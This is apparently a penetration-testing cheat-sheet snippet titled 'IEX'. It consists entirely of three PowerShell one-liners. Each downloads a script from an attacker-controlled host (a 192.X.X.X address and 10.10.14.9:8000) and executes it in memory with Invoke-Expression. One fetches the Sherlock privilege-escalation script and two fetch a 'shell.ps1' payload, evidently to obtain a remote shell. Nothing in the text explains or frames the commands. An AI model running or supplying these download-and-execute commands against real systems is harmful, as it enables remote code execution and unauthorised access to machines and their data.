
## IEX

```powershell

echo IEX (New-Object Net.WebClient).DownloadString('http://192.X.X.X/Sherlock.ps1') | powershell -NoProfile -Command -

```

```powershell

powershell -C 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.9:8000/shell.ps1")'

```


```powershell

powershell -Command "IEX (Invoke-WebRequest -Uri 'http://10.10.14.9:8000/shell.ps1' -UseBasicParsing).Content"

```